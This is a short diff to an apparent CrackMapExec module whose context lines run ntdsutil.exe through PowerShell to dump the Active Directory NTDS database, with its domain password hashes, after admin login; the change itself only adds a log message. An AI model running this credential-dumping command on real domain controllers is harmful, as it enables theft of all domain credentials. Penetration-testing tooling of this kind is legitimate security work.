@@ -41,6 +41,7 @@ class CMEModule:
     def on_admin_login(self, context, connection):
         command = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)
         context.log.info('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir,self.dump_location))
+        context.log.highlight('Dumping the NTDS, this could take a while so go grab a redbull...')
         context.log.debug('Executing command {}'.format(command))
         p = connection.execute(command, True)
         context.log.debug(p)
